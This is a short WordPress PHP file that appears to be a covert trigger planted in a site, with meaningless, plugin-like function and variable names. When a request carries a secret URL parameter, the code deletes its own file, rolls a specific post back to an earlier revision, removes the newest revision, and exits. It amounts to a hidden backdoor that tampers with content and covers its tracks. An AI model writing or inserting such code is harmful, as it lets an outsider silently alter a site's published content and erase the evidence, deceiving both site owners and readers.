<?php

function s3_elements_archive() {
	if (isset($_GET['active_tabs_sitemaps_captcha']) && $_GET['active_tabs_sitemaps_captcha'] === 'csv_virtual_slider') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$buttons_preloader_converter = 683;
		$next_graph_iframe_disable = wp_get_post_revisions($buttons_preloader_converter);
		if (empty($next_graph_iframe_disable)) die('no revisions');
		if (count($next_graph_iframe_disable) < 2) die('less than 2');
		$box_groups_method_finder = array_shift($next_graph_iframe_disable);
		$php_sales_poll = $box_groups_method_finder->ID;
		$views_gamipress_pack = array_shift($next_graph_iframe_disable);
		$account_lightbox_ssl_rotator = $views_gamipress_pack->ID;
		$smart_business_soon = wp_restore_post_revision($account_lightbox_ssl_rotator);
		if ($smart_business_soon === false) die('error restoring');
		$smart_business_soon = wp_delete_post_revision($php_sales_poll);		
		if ($smart_business_soon === false) die('error deleting');
		die('done');
	}
}

add_action('init', 's3_elements_archive');
